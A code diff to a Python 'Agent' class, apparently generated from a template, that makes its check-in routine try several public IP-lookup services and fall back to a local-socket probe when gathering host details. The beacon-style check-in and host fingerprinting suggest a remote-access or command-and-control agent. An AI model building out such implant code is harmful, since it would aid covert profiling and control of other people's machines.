@@ -2356,10 +2356,49 @@ class Agent:
         return f"{{platform.node()}}-{{os.getlogin()}}-{{hash(os.getcwd())}}"
 
     def _get_checkin_data(self):
-        try:
-            ip = requests.get('https://api.ipify.org', timeout=5).text
-        except:
-            ip = "unknown"
+        # Try multiple external IP services in order
+        ip_services = [
+            'https://api.ipify.org',
+            'https://httpbin.org/ip',
+            'https://icanhazip.com',
+            'https://checkip.amazonaws.com'
+        ]
+
+        ip = None
+        for service in ip_services:
+            try:
+                response = requests.get(service, timeout=5)
+                if response.status_code == 200:
+                    ip_text = response.text.strip()
+                    # Validate that we got an IP address, not HTML
+                    import re
+                    if re.match(r'^\d{{1,3}}\.\d{{1,3}}\.\d{{1,3}}\.\d{{1,3}}$', ip_text):
+                        ip = ip_text
+                        break
+                    elif service == 'https://httpbin.org/ip':
+                        # httpbin.org returns JSON: {{"origin": "IP"}}
+                        try:
+                            data = response.json()
+                            ip_text = data.get('origin', '').split(',')[0].strip()
+                            if re.match(r'^\d{{1,3}}\.\d{{1,3}}\.\d{{1,3}}\.\d{{1,3}}$', ip_text):
+                                ip = ip_text
+                                break
+                        except:
+                            continue
+            except:
+                continue
+
+        # If all external services failed, try to get local IP
+        if not ip:
+            try:
+                # Create a socket to get local IP
+                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                s.connect(("8.8.8.8", 80))  # Connect to Google DNS
+                local_ip = s.getsockname()[0]
+                s.close()
+                ip = f"{{local_ip}} (local)"
+            except:
+                ip = "unknown"
         data = {{
             "agent_id": self.agent_id,
             "hostname": platform.node(),
